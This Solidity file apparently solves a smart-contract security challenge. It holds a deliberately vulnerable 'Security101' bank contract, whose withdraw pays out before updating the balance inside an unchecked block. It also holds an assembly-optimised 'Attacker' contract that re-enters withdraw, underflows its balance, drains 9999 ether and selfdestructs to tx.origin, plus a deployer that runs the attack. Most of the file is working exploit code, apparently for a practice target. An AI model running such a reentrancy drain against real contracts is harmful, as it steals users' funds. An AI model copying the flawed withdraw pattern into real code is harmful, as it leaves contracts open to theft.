// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
    }

    function withdraw(uint256 amount) external {
        unchecked {
            require(balances[msg.sender] >= amount, 'insufficient funds');
            (bool ok, ) = msg.sender.call{value: amount}('');
            require(ok, 'transfer failed');
            balances[msg.sender] -= amount;
        }
    }
}

contract Attacker {
    address internal immutable attacked;

    constructor(address _attacked) payable {
        attacked = _attacked;
        assembly {
            mstore(0, 0xd0e30db0)
            let suc := call(gas(), _attacked, 1000000000000000000, 28, 8, 0, 0)
        }
    }

    receive() external payable {
        address _attacked = attacked;
        assembly {
            if gt(selfbalance(), 1000000000000000000) {
                return(0,0) 
            }
            
            let _balance := selfbalance()
            mstore( 0, 0x2e1a7d4d)
            mstore(32, 1000000000000000000)
            let suc := call(gas(), _attacked, 0, 28, 36, 0, 0)

            if eq(_balance, 1000000000000000000) { return (0,0) }

            mstore(32, 9999000000000000000000)
            suc := call(gas(), _attacked, 0, 28, 36, 0, 0)
            selfdestruct(origin())
        }
    }
}

contract OptimizedAttackerSecurity101{
    constructor (address _attacked) payable {
        Attacker _attacker = new Attacker{value: 1 ether}(_attacked);
        assembly {
            let res := call(gas(), _attacker, 0, 0, 0, 0, 0)
            selfdestruct(origin())
        }
    }
}

// 1 199862